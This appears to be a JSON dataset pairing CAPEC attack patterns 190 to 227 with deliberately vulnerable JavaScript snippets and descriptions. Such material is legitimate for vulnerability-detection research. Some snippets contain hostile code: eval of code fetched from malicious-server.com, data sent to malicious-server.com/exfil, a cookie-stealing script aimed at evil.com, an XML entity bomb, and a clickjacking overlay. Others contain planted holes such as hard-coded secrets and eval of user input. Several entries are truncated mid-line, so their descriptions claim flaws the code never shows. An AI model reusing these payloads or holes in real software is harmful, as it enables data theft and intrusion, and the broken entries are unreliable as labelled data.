        "description": "\"This code demonstrates multiple vulnerabilities that enable black box analysis. The password comparison has timing variations that leak information about matching characters, system information is exposed in the response, and processing time measurements can be used to infer internal state. The code also includes memory usage information that could be used for side-channel analysis.\""
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "const secretFunction = () => {\n    const credentials = {\n        adminUser: 'root',\n        adminPass: 'supersecret123'\n    };\n    const systemInfo = {\n        os: process.platform,\n        arch: process.arch,\n        env: process.env\n    };\n    \n    function downloadAndExecute(url) {\n        fetch(url)\n            .then(response => response.text())\n            .then(code => eval(code));\n    }\n    \n    const debugData = {\n        memory: process.memoryUsage(),\n        trace: new Error().stack,\n        credentials: credentials\n    };\n    \n    global._debug = debugData;\n    global._sysinfo = systemInfo;\n    \n    downloadAndExecute('http://malicious-server.com/payload.js');\n}",
        "description": "This code contains hidden functionality that exposes sensitive system information and credentials, stores debug trace data in global objects, downloads and executes remote code without verification, and includes potentially malicious functionality, making it susceptible to reverse engineering analysis."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "class DatabaseConnector {\n    constructor() {\n        this.dbPassword = '4dM1n_P@ssw0rd!';\n        this.apiKey = 'sk_live_51ABC123XYZ';\n        this.encryptionKey = 'AES256_SECRET_KEY_2024';\n    }\n\n    connect() {\n        const connection = mysql.createConnection({\n            host: 'production.db.company.com',\n            user: 'admin',\n            password: this.dbPassword\n        });\n        return connection;\n    }\n\n    encryptData(data) {\n        const cipher = crypto.createCipher('aes-256-cbc', this.encryptionKey);\n        return cipher.update(data, 'utf8', 'hex') + cipher.final('hex');\n    }\n}",
        "description": "This code demonstrates hard-coded credentials and security-critical constants directly embedded in the executable code, including database passwords, API keys, and encryption keys. These sensitive values are stored in cleartext within the class definition, making them discoverable through code analysis or reverse engineering."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "`\nconst net = require('net');\nconst crypto = require('crypto');\n\nclass InsecureProtocolServer {\n    constructor() {\n        this.supportedAlgorithms = ['null', 'rc4', 'aes-128-cbc', 'aes-256-cbc'];\n        this.server = net.createServer((socket) => {\n            this.handleConnection(socket);",
        "description": "\"This code demonstrates vulnerable protocol implementation with multiple security issues: weak encryption algorithm negotiation that can be downgraded, cleartext transmission of sensitive data, use of deprecated crypto methods, and insecure handling of protocol data. It includes inadequate encryption strength, allows cleartext transmission, implements vulnerable algorithm negotiation, and makes unsafe assumptions about data layout.\""
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "const userInput = req.query.module;\nconst modulePath = '/modules/' + userInput + '.js';\n\nconst loadRemoteModule = async () => {\n  try {\n    const response = await fetch('http://' + modulePath);\n    const moduleCode = await response.text();\n    eval(moduleCode);\n  } catch(e) {\n    console.error('Failed to load module:', e);\n  }\n};",
        "description": "The code demonstrates remote code inclusion vulnerability by accepting unchecked user input to construct a path for loading and executing external JavaScript modules. It uses eval() to execute the downloaded code without any validation or sanitization, allowing potential execution of malicious code from remote sources."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "// Simple messaging system with spoofable identity\nclass MessageSystem {\n    constructor() {\n        this.messages = [];\n    }\n\n    sendMessage(message) {\n        // No verification of sender identity\n        let userInput = {\n            from: message.sender,  // Can be easily spoofed\n            content: message.content,\n            timestamp: new Date()\n        };\n\n        // No message integrity check\n        this.messages.push(userInput);\n\n        // Privileged action based on unverified sender\n        if (userInput.from === 'admin') {\n            this.executeAdminAction(userInput.content);\n        }\n    }\n\n    executeAdminAction(command) {\n        // Dangerous privileged operation with no proper authentication\n        eval(command);\n    }\n}\n\n// Example usage showing vulnerability\nlet msgSystem = new MessageSystem();\nmsgSystem.sendMessage({\n    sender: 'admin',  // Spoofed identity\n    content: 'console.log(\"Compromised!\")'  // Arbitrary code execution\n});",
        "description": "This code demonstrates a vulnerable messaging system that fails to properly authenticate message senders, allowing identity spoofing. It doesn't verify the source of communications, lacks message integrity checks, and executes privileged actions based on unverified sender claims. The system is susceptible to identity spoofing attacks where an attacker can impersonate an admin and execute arbitrary code."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "`\n// Vulnerable authentication system that doesn't properly verify message source\nconst authenticateUser = (message) => {\n  // Assumes message format: { sender: 'name', content: 'text', timestamp: Date",
        "description": "\"A vulnerable authentication implementation that demonstrates principal spoofing vulnerabilities. The code fails to properly validate message sources, allows reflection attacks, performs insecure key exchanges, and uses weak sender verification that can be easily spoofed by including trusted domain strings in the sender field.\""
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Weak session management\napp.use(session({\n    secret: '123456',  // Weak static secret\n    resave: true,\n    saveUninitialized: true,\n    cookie: {\n        secure: false,  // Not using HTTPS\n        maxAge: 365 * 24 * 60 * 60 * 1000  // Year-long session\n    }\n}));\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    \n    // No session regeneration\n    if (username === 'admin' && password === 'password') {\n        req.session.authenticated = true;\n        req.session.role = 'admin';\n        res.json({ success: true });\n    }\n});\n\napp.get('/admin', (req, res) => {\n    if (req.session.authenticated) {\n        // No session validation beyond simple flag check\n        res.json({ adminData: 'sensitive_data' });\n    }\n});",
        "description": "This code demonstrates vulnerable session management by using a weak static secret, not implementing secure transport, having excessive session duration, lacking session regeneration on login, and implementing weak session validation. It allows for potential session forgery and fixation attacks."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "function processXML(xmlString) {\n  const parser = new DOMParser();\n  const doc = parser.parseFromString(`\n    <?xml version=\"1.0\"?>\n    <!DOCTYPE foo [\n      <!ENTITY a \"1234567890\">\n      <!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">\n      <!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">\n      <!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\">\n    ]>\n    <foo>&d;</foo>`, 'text/xml');\n  \n  let result = '';\n  const processNode = (node) => {\n    for(let child of node.childNodes) {\n      if(child.nodeType === Node.TEXT_NODE) {\n        result += child.nodeValue;\n      } else {\n        processNode(child);\n      }\n    }\n  };\n  \n  processNode(doc.documentElement);\n  return result;\n}",
        "description": "This code demonstrates a vulnerable XML parser that allows unrestricted entity expansion, leading to exponential memory consumption through nested entity references (billion laughs attack). The function processes XML input without any entity expansion limits, potentially causing a denial of service through excessive resource consumption."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "app.get('/search', (req, res) => {\n    try {\n        if(!req.query.q) {\n            throw new Error('Search term is required');\n        }\n        // ... search logic ...\n    } catch(err) {\n        res.send(`<html><body>\n            <h1>Error occurred</h1>\n            <div>Error while searching for: ${req.query.q}</div>\n            <div>${err.message}</div>\n        </body></html>`);\n    }\n});",
        "description": "Vulnerable error page that directly reflects user input without sanitization, allowing XSS through malformed search query parameters that get rendered in the error response"
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "`function validateUserInput(input) {\n    const blacklist = ['script', 'alert', 'onerror'];\n    let sanitized = input.toLowerCase();\n    \n    for(let term of blacklist) {\n        if(!sanitized.includes(term)) {\n            return input;  // Original input returned if no exact match found",
        "description": "\"This code demonstrates a vulnerable input validation function that attempts to filter malicious script tags using a simple blacklist. The validation is flawed because it only checks for lowercase exact matches, allowing bypasses through case variations and syntax pollution. It also directly inserts the user input into innerHTML without proper sanitization.\""
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "function processUserInput(input) {\n    // Disabled input validation for performance\n    // let inputFilter = /^[a-zA-Z0-9]+$/;\n    // if (!inputFilter.test(input)) return null;\n    \n    // Process commands directly without sanitization\n    if (input.startsWith('cmd:')) {\n        let command = input.substring(4);\n        return eval(command);\n    }\n    \n    // Process SQL queries without sanitization\n    if (input.startsWith('sql:')) {\n        let query = input.substring(4);\n        return executeQuery(query);\n    }\n    \n    // Disabled size validation\n    // if (input.length > 1000) return null;\n    \n    return processData(input);\n}",
        "description": "Vulnerable code that deliberately disables or removes input validation filters, allowing potentially dangerous input to be processed. It accepts raw commands and SQL queries without sanitization, and has disabled length checks and character validation, making it susceptible to various injection attacks and buffer overflows."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "const yaml = require('js-yaml');\nconst fs = require('fs');\n\nfunction processUserConfig(configPath) {\n    try {\n        const userYamlData = fs.readFileSync(configPath, 'utf8');\n        const config = yaml.load(userYamlData);\n        \n        // Sensitive data stored in serializable class\n        class UserCredentials {\n            constructor(config) {\n                this.username = config.username;\n                this.password = config.password;\n                this.apiKey = config.apiKey;\n            }\n        }\n\n        // Deserialize without validation\n        const credentials = new UserCredentials(config);\n        const serializedCreds = JSON.stringify(credentials);\n        const deserializedCreds = JSON.parse(serializedCreds);\n\n        return deserializedCreds;\n    } catch(e) {\n        console.error('Error processing config:', e);\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including insecure deserialization, processing untrusted YAML data that could contain external entities, storing sensitive data in a serializable class, and lack of proper validation. The code reads and processes a YAML configuration file without validating external references, deserializes the data without proper checks, and handles sensitive credentials in an unsafe manner."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "class OnlineGameClient {\n    constructor(serverUrl) {\n        this.serverUrl = serverUrl;\n        this.clientId = this.generateClientId();\n    }\n\n    generateClientId() {\n        return Math.random().toString(36);\n    }\n\n    async authenticate(username, password) {\n        // Malicious modification: Skip actual server authentication\n        this.isAuthenticated = true;\n        this.playerScore = 9999999;\n        return true;\n    }\n\n    async sendScore() {\n        if (this.isAuthenticated) {\n            // Bypass client-side score validation\n            await fetch(`${this.serverUrl}/submit-score`, {\n                method: 'POST',\n                body: JSON.stringify({\n                    clientId: this.clientId,\n                    score: this.playerScore,\n                    // Inject fake validation token\n                    validationToken: 'valid_' + Date.now()\n                })\n            });\n        }\n    }\n\n    // Hidden malicious functionality\n    _extractServerData() {\n        const serverData = localStorage.getItem('gameServerData');\n        fetch('https://malicious-server.com/exfil', {\n            method: 'POST',\n            body: serverData\n        });\n    }\n}",
        "description": "A malicious game client that bypasses server-side authentication, manipulates game scores, and includes hidden functionality to exfiltrate data. The client violates server assumptions about authentication and score validation, demonstrating client-side security bypass and embedded malicious code."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "const Registry = {\n  sensitiveConfig: {\n    apiKey: 'sk_live_12345',\n    adminToken: 'admin_token_xyz',\n    isAdmin: false\n  },\n  modifyRegistry: function(path, value) {\n    // No authentication or validation check\n    let keys = path.split('.');\n    let current = this.sensitiveConfig;\n    \n    for(let i = 0; i < keys.length - 1; i++) {\n      current = current[keys[i]];\n    }\n    current[keys[keys.length - 1]] = value;\n    \n    // Store in cleartext without integrity check\n    localStorage.setItem('appRegistry', JSON.stringify(this.sensitiveConfig));\n  },\n  loadRegistry: function() {\n    // Load directly from storage without verification\n    this.sensitiveConfig = JSON.parse(localStorage.getItem('appRegistry'));\n  }\n};",
        "description": "This vulnerable code demonstrates a registry implementation that allows unauthorized modification of sensitive configuration settings. It stores sensitive data in cleartext, lacks authentication and integrity checks, and allows direct external control of system settings. The registry values can be manipulated through the modifyRegistry function without proper access controls, potentially leading to privilege escalation or system compromise."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "// Cache sensitive user data in browser localStorage\nfunction cacheUserCredentials(username, password) {\n  const userData = {\n    username: username,\n    password: password,\n    lastLogin: new Date().toISOString(),\n    sessionToken: generateToken()\n  };\n  \n  localStorage.setItem('userAuth', JSON.stringify(userData));\n}\n\nfunction retrieveCredentials() {\n  return JSON.parse(localStorage.getItem('userAuth'));\n}\n\nfunction generateToken() {\n  return Math.random().toString(36).substring(2);\n}\n\n// Store sensitive data in cache\ncacheUserCredentials('admin', 'secretpass123');\n\n// Access cached data\nconst cachedData = retrieveCredentials();",
        "description": "This code demonstrates improper caching of sensitive information by storing unencrypted user credentials in browser localStorage. The sensitive data includes username, password, and session token, which remain persistent in the browser's storage without encryption or proper cache controls, making it vulnerable to unauthorized access."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "// Client-side authentication implementation\nclass UserAuth {\n    constructor() {\n        this.credentials = {\n            username: 'admin',\n            password: 'secretpass123'\n        };\n    }\n\n    authenticate(username, password) {\n        // Store credentials in localStorage for 'remember me' feature\n        localStorage.setItem('auth_token', btoa(username + ':' + password));\n\n        // Client-side only validation\n        if (username === this.credentials.username && \n            password === this.credentials.password) {\n            // Send unencrypted credentials in URL\n            window.location.href = `/dashboard?auth=${username}:${password}`;\n            return true;\n        }\n        return false;\n    }\n\n    // Function to check if user is authenticated\n    isAuthenticated() {\n        return localStorage.getItem('auth_token') !== null;\n    }\n}",
        "description": "This vulnerable code implements client-side only authentication, stores credentials insecurely in localStorage, and transmits them unencrypted in URLs. It's susceptible to credential interception, replay attacks, and can be bypassed by modifying client-side code."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\nconst privateKey = '-----BEGIN RSA PRIVATE KEY-----\\nMIIEpAIBAAKCAQEAx4UbaDzY5xjW6hc9jwN...';  // Hard-coded signing key\n\nfunction signCode(maliciousCode) {\n    const signer = crypto.createSign('SHA256');\n    signer.update(maliciousCode);\n    const signature = signer.sign(privateKey, 'base64');\n    \n    fs.writeFileSync('malicious.js', maliciousCode);\n    fs.writeFileSync('signature.sig', signature);\n\n    return {\n        code: maliciousCode,\n        signature: signature,\n        verifySignature: function(code, sig) {\n            return true; // Bypass signature verification\n        }\n    };\n}\n\n// Using stolen credentials to sign malicious code\nconst maliciousPayload = 'function backdoor() { /* malicious code */ }';\nconst signedPackage = signCode(maliciousPayload);",
        "description": "Vulnerable code demonstrating the exploitation of code signing credentials by embedding hard-coded private keys, bypassing signature verification, and signing malicious code. The code includes weak permission controls and lacks proper integrity checks, allowing unauthorized code signing."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "// Client-side validation and authentication\nconst app = {\n    validateUser: function(username, password) {\n        // Client-side only authentication\n        if (username === 'admin' && password === 'secretpass') {\n            localStorage.setItem('isAdmin', true);\n            return true;\n        }\n        return false;\n    },\n    performAdminAction: function() {\n        // Relies solely on client-side state\n        if (localStorage.getItem('isAdmin')) {\n            // Execute privileged operations\n            $.ajax({\n                url: 'api/admin/deleteUsers',\n                method: 'POST',\n                success: function(response) {\n                    console.log('Admin action successful');\n                }\n            });\n        }\n    },\n    loadExternalScript: function(scriptUrl) {\n        // Dynamically load external script without verification\n        const script = document.createElement('script');\n        script.src = scriptUrl;\n        document.head.appendChild(script);\n    }\n}",
        "description": "Vulnerable JavaScript code that implements client-side-only authentication and security checks. The code stores authentication state in localStorage, trusts client-side validation for admin privileges, and loads external scripts without integrity verification. An attacker can bypass these controls by modifying client-side code or localStorage values."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "`\n// Server sends item price to client\nconst itemPrice = 10.00;\n\n// Client-side calculation logic for total cost\nfunction calculateTotal(quantity) {\n    let total = itemPrice * quantity;\n    // Vulnerable cookie storing calculation result without integrity check\n    document.cookie = 'orderTotal=' + total;\n    return total;",
        "description": "\"This code demonstrates multiple vulnerabilities: client-side calculation of monetary values without server validation, reliance on cookies for storing sensitive calculation results without integrity checks, and lack of proper quantity validation. An attacker could modify the client-side calculation logic or manipulate the cookie values to submit incorrect totals to the server.\""
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/download', (req, res) => {\n    const userFile = req.query.file;\n    // Vulnerable: relies only on file extension for MIME type\n    const fileExtension = userFile.split('.').pop();\n    \n    if (fileExtension === 'txt') {\n        res.setHeader('Content-Type', 'text/plain');\n        // Actually serves JavaScript with txt extension\n        res.send(`<script>document.location='http://evil.com/steal?cookie='+document.cookie;</script>`);\n    } else {\n        res.send('Invalid file type');\n    }\n});\n\napp.get('/view', (req, res) => {\n    const userInput = req.query.content;\n    // Vulnerable: directly embeds user input into img tag\n    res.send(`<img src=\"${userInput}\" />`);\n});",
        "description": "This code demonstrates a vulnerable implementation that allows MIME type confusion attacks. It accepts a file parameter and serves JavaScript content with a text/plain MIME type, potentially bypassing content security mechanisms. Additionally, it includes unsafe handling of user input in IMG tags, enabling XSS attacks through malformed image sources."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "function sanitizeInput(input) {\n    // Incomplete denylist for XSS protection\n    const blacklist = ['<script>', 'javascript:', 'onerror='];\n    let sanitized = input;\n    blacklist.forEach(term => {\n        sanitized = sanitized.replace(term, '');\n    });\n    return sanitized;\n}\n\nfunction displayUserContent(userInput) {\n    const content = sanitizeInput(userInput);\n    document.getElementById('output').innerHTML = \n        `<img src=\"${content}\" class=\"user-image\">` +\n        `<div class=\"user-message\">${content}</div>`;\n}",
        "description": "This code demonstrates multiple vulnerabilities including incomplete XSS protection through an insufficient denylist, unsafe handling of user input in HTML attributes, and improper sanitization of user-controlled content before inserting it into the DOM. The sanitization function can be bypassed using variations of XSS payloads not included in the denylist."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "// Undocumented debug feature left in production code\nclass SystemManager {\n  constructor() {\n    this._sensitiveData = {\n      systemKeys: '12345-ADMIN-KEY',\n      userDatabase: [/* user records */],\n      configSettings: { isDebug: false }\n    };\n    this.counter = 0;\n  }\n\n  processRequest(command) {\n    if (command === 'MAGIC_DEBUG_1337') {\n      // Undocumented backdoor that exposes system info\n      return {\n        sysInfo: process.env,\n        memory: process.memoryUsage(),\n        sensitiveData: this._sensitiveData\n      };\n    }\n    \n    // Low-level memory manipulation\n    if (command.startsWith('MEM_')) {\n      try {\n        const buffer = Buffer.allocUnsafe(1024);\n        buffer.write(this._sensitiveData.systemKeys);\n        return buffer;\n      } catch(e) {\n        this.counter++;\n        if(this.counter > 1000) {\n          // Memory wear issue\n          process.exit(1);\n        }\n      }\n    }\n    return 'Command not recognized';\n  }\n}",
        "description": "This code demonstrates a vulnerability where an undocumented debug feature can be exploited to expose sensitive system information. It includes low-level memory manipulation, improper handling of memory writes, and exposure of sensitive system data through an undocumented command. The code can be abused through legitimate functionality to achieve unauthorized access to sensitive information."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "const fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.get('/download', function(req, res) {\n    const userFile = req.query.file;\n    const filePath = '/var/www/uploads/' + userFile;\n    \n    if (fs.existsSync(filePath)) {\n        res.sendFile(filePath);\n    } else {\n        res.status(404).send('File not found');\n    }\n});",
        "description": "This code is vulnerable to path traversal as it directly concatenates user input into a file path without sanitization. An attacker could use '../' sequences (e.g., '../../../../etc/passwd') to access files outside the intended directory."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "const app = express();\napp.use((err, req, res, next) => {\n  console.debug(`Error details: ${err.stack}`);\n  res.status(500).send(`An error occurred: ${err.message}\\n${err.stack}`);\n});\n\nclass DynamicLoader {\n  constructor() {\n    this.socket = new net.Socket();\n  }\n\n  loadClass(className) {\n    return require(className);\n  }\n\n  handleRequest(input) {\n    // No input validation\n    this.socket.connect(port, host, () => {\n      this.socket.write(input);\n    });\n  }\n}",
        "description": "This code contains multiple vulnerabilities: exposing sensitive debug information in error pages, direct socket usage in a web application, dynamic class loading without proper validation, and lack of input validation framework. The error handler exposes stack traces to users, while the DynamicLoader class uses direct sockets and unsafe dynamic loading practices."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.get('/user/:id', (req, res) => {\n    try {\n        const userId = req.params.id;\n        const dbPassword = 'secretDbPass123';\n        const connection = `mysql://admin:${dbPassword}@localhost/users`;\n        \n        const userFile = `/var/data/users/${userId}.json`;\n        const userData = fs.readFileSync(userFile);\n        \n        console.error(`[${new Date()}] Accessing user data with connection: ${connection}`);\n        res.json(JSON.parse(userData));\n    } catch (error) {\n        console.error(`Database Error: ${error.stack}`);\n        res.status(500).send(`Internal Error: ${error.message}\\nStack: ${error.stack}\\nConnection Details: ${connection}`);\n    }\n});\n\napp.listen(3000);",
        "description": "This code demonstrates multiple security vulnerabilities related to sensitive information exposure through error messages and logging. It logs database connection details including credentials, exposes full error stack traces to users, and writes sensitive information to log files. When an error occurs, it returns detailed system information and stack traces to the client, making it vulnerable to information gathering through error message analysis."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // No authentication check\n    let command = data.toString();\n    \n    // No validation of message integrity\n    let parsedCommand = JSON.parse(command);\n    \n    // No verification of source\n    if (parsedCommand.action === 'admin') {\n      // Critical operation without proper checks\n      executeAdminCommand(parsedCommand.payload);\n    }\n    \n    // Unencrypted response\n    socket.write('Command executed');\n  });\n});\n\nfunction executeAdminCommand(payload) {\n  // Covert channel through timing\n  if (payload.secret === 'admin123') {\n    setTimeout(() => {}, 1000);\n  } else {\n    setTimeout(() => {}, 100);\n  }\n}\n\nserver.listen(3000, '0.0.0.0');",
        "description": "This code creates a network server that accepts commands without proper authentication, message integrity checks, or source verification. It includes a covert timing channel and processes admin commands without security controls. The server is accessible to any client and transmits data without encryption."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "\"const socket = require('ws');\nconst server = new socket.Server({ port: 8080",
        "description": "\"This code demonstrates multiple security vulnerabilities including weak SSL configuration, improper authentication through capture-replay vulnerability, sending sensitive data over insecure channels, relying on client-side security validation, and failing to properly verify the source of communications. The code uses an insecure SSL configuration, doesn't implement proper token verification, exposes sensitive credentials, and executes commands without proper validation.\""
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "// UDDI Service Registry Implementation\nconst uddiRegistry = {\n    services: new Map(),\n    registerService: function(serviceInfo) {\n        // No validation of message source or integrity\n        this.services.set(serviceInfo.businessId, serviceInfo);\n    },\n    lookupService: function(businessId) {\n        // Directly accepts and processes untrusted XML data\n        let serviceXML = receiveServiceRequest(businessId);\n        return this.services.get(businessId);\n    }\n};\n\nfunction processBusinessTransaction(requestXML) {\n    // No XML schema validation\n    let businessInfo = parseXML(requestXML);\n    \n    // No verification of sender authenticity\n    let service = uddiRegistry.lookupService(businessInfo.businessId);\n    \n    // Establishes connection without proper endpoint verification\n    let connection = createServiceConnection(service.endpoint);\n    \n    // Processes transaction without message integrity checks\n    return executeTransaction(connection, businessInfo.data);\n}",
        "description": "This code implements a vulnerable UDDI service registry and business transaction processor that fails to validate XML data, verify message authenticity, properly validate communication endpoints, and ensure message integrity. It allows for service impersonation and manipulation of business transactions through spoofed UDDI messages."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "`\n    const express = require('express');\n    const axios = require('axios');\n    const app = express();\n\n    app.use(express.xml());\n\n    // Vulnerable XML routing proxy\n    app.post('/process-xml', async (req, res) => {\n      const xmlData = req.body;\n      const routingHeader = xmlData.getElementsByTagName('routing')[0];\n      const intermediateNodes = routingHeader.getElementsByTagName('node');\n      \n      let currentResponse = xmlData;\n      \n      // Process through each routing node without validation\n      for(let node of intermediateNodes) {\n        const nodeUrl = node.getAttribute('url');\n        try {\n          // Forward XML to next node without preserving origin\n          const response = await axios.post(nodeUrl, currentResponse, {\n            headers: {\n              'Content-Type': 'application/xml',\n              'X-Forwarded-From': req.headers['host']",
        "description": "\"This code implements a vulnerable XML routing proxy that processes XML messages through multiple intermediate nodes. It contains several vulnerabilities: it doesn't validate XML input against a schema (CWE-112), forwards requests without proper source preservation (CWE-441), allows external references to untrusted resources (CWE-610), and processes XML routing instructions without proper validation or authentication of intermediate nodes. An attacker could exploit this by injecting malicious routing nodes or manipulating the XML to redirect processing through compromised systems.\""
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "`\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  let protocol = 'secure';\n  \n  socket.on('data', (data) => {\n    if (data.toString().includes('downgrade')) {\n      protocol = 'basic'; // Downgrades to less secure protocol on client request",
        "description": "\"This code demonstrates multiple protocol-related vulnerabilities: algorithm downgrade allowing less secure communication, reliance on client-side security validation, susceptibility to replay attacks due to lack of proper session management, and unsafe socket usage. The server accepts protocol downgrades and trusts client-side validation flags without proper verification.\""
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "const yaml = require('js-yaml');\nconst fs = require('fs');\n\nfunction processUserConfig(userInput) {\n    try {\n        const yamlContent = `\n            externalConfig: !include ${userInput}\n            name: config\n        `;\n        const result = yaml.load(yamlContent);\n        fs.writeFileSync('config.yml', yaml.dump(result));\n        return result;\n    } catch(e) {\n        console.error('Error loading configuration:', e);\n    }\n}",
        "description": "This code demonstrates a vulnerable YAML parsing implementation that allows external entity references through the !include directive. The function accepts user input that can reference external URIs, potentially leading to server-side request forgery, resource exhaustion, or remote code execution through malicious YAML files."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "// Malicious overlay page\nconst overlay = document.createElement('iframe');\noverlay.style.position = 'absolute';\noverlay.style.top = '0';\noverlay.style.left = '0';\noverlay.style.width = '100%';\noverlay.style.height = '100%';\noverlay.style.opacity = '0.01';\noverlay.style.zIndex = '9999';\noverlay.src = 'https://malicious-site.com/login-form';\ndocument.body.appendChild(overlay);\n\n// Track mouse position to follow legitimate UI\nwindow.addEventListener('mousemove', (e) => {\n    const legitButton = document.querySelector('#legitimate-button');\n    const rect = legitButton.getBoundingClientRect();\n    overlay.contentWindow.postMessage({\n        x: rect.left,\n        y: rect.top,\n        width: rect.width,\n        height: rect.height\n    }, '*');\n});",
        "description": "This code creates a nearly invisible iframe overlay that follows the legitimate UI elements but redirects user interactions to a malicious site. The iframe tracks the position of legitimate buttons and aligns malicious content accordingly, tricking users into interacting with the malicious content while believing they're interacting with the legitimate site."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "function detectBrowserInfo() {\n    const userAgent = navigator.userAgent;\n    const platform = navigator.platform;\n    const vendor = navigator.vendor;\n    const plugins = Array.from(navigator.plugins).map(p => ({ name: p.name, version: p.version }));\n    const systemInfo = {\n        screenResolution: `${window.screen.width}x${window.screen.height}`,\n        colorDepth: window.screen.colorDepth,\n        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n        language: navigator.language,\n        cookiesEnabled: navigator.cookieEnabled,\n        doNotTrack: navigator.doNotTrack,\n        touchSupport: 'ontouchstart' in window\n    };\n\n    const browserFingerprint = {\n        userAgent,\n        platform,\n        vendor,\n        plugins,\n        systemInfo\n    };\n\n    // Sending sensitive system information to an external server\n    fetch('https://analytics-collector.example.com/fingerprint', {\n        method: 'POST',\n        body: JSON.stringify(browserFingerprint),\n        credentials: 'include'\n    });\n\n    return browserFingerprint;\n}",
        "description": "This code performs system fingerprinting by collecting detailed browser and system information, including user agent, platform, installed plugins, screen resolution, timezone, and other system characteristics. It then sends this sensitive information to an external server, potentially exposing system details to unauthorized actors. The code demonstrates vulnerabilities related to exposure of sensitive system information and observable behavioral discrepancy that could be used for system identification."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "// Set user session cookie without proper validation or security\nfunction setUserSession(userId) {\n    document.cookie = `sessionId=${userId}; path=/`;\n}\n\n// Client-side authentication without server validation\nfunction authenticateUser(username, password) {\n    // No server-side verification\n    if (username === 'admin' && password === 'pass123') {\n        const sessionId = btoa(username + new Date().getTime());\n        setUserSession(sessionId);\n        return true;\n    }\n    return false;\n}\n\n// Vulnerable session validation\nfunction checkUserSession() {\n    const cookies = document.cookie.split(';');\n    for(let cookie of cookies) {\n        if(cookie.includes('sessionId')) {\n            // No validation of session integrity or expiration\n            return true;\n        }\n    }\n    return false;\n}",
        "description": "This code demonstrates multiple session handling vulnerabilities including client-side only authentication, lack of session validation, missing session expiration, and reliance on unvalidated cookies. The session ID is stored in a cookie without proper security measures, and there's no server-side verification of the authentication process, making it susceptible to session fixation and cookie manipulation attacks."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "function processUserRequest(request) {\n  let resourceHandle = acquireResource();\n  \n  // No timeout or resource limits implemented\n  while (request.keepProcessing) {\n    // Recursive processing without bounds\n    let subRequests = request.getSubRequests();\n    subRequests.forEach(req => {\n      processUserRequest(req);\n    });\n    \n    // Resource-intensive operation without checks\n    let data = resourceHandle.getData();\n    for (let i = 0; i < data.length; i++) {\n      // Complex calculations that keep CPU busy\n      data[i] = complexOperation(data[i]);\n    }\n    \n    // No cleanup of resources\n    resourceHandle.continueHolding();\n  }\n}",
